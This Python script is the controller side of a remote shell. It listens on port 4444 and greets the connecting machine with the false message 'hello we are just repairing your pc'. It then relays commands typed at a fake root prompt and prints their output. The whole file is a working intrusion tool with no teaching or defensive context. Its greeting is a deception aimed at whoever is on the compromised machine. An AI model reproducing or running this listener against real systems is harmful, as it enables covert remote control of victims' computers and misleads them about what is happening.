#!/usr/bin/python3
import socket

host = input("ENTER THE HOST:")
port = 4444
buffer_size = 1024

socket = socket.socket()

def main():
	try:
		socket.bind((host, port))
		socket.listen(5)
		print (f"listening on {host}:{port}...")
		client_sock, client_add = socket.accept()
		message = "hello we are just repairing your pc".encode()
		client_sock.send(message)
	except:
		print ("abort...")
		exit()
	while True:
		command = input("root@system:~$")
		client_sock.send(command.encode())
		if command.lower() == "exit":
			break
		result = client_sock.recv(buffer_size).decode()
		print (result)
	client_sock.close()
	socket.close()
main()
